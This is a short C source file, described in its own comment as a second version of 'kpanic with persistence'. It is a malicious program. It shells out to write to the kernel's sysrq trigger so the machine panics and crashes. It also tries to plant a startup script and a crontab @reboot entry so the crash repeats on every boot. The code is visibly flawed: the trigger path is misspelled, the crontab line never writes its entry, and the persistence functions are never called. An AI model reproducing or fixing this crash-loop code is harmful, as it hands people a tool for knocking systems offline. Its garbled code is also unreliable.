/* v2 of kpanic with persistence */ 

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define MAX_CMN_LEN 100

int create () {
    char shellscript[MAX_CMN_LEN] = "touch startup.sh && echo echo c > /proc/sysrq-triggers > startup.sh && chmod 755 startup.sh";
    system(shellscript);
    return 0;
}

int startup () {
    char script[MAX_CMN_LEN] = "crontab -l > tmpfile && echo @reboot startup.sh && crontab tmpfile && rm tmpfile";
    system(script);
    return 0;
}
    
int main () {
    char kpanic[MAX_CMN_LEN] = "echo c > /proc/sysrq-triggers", **p;
    system(kpanic);
    return 0;
}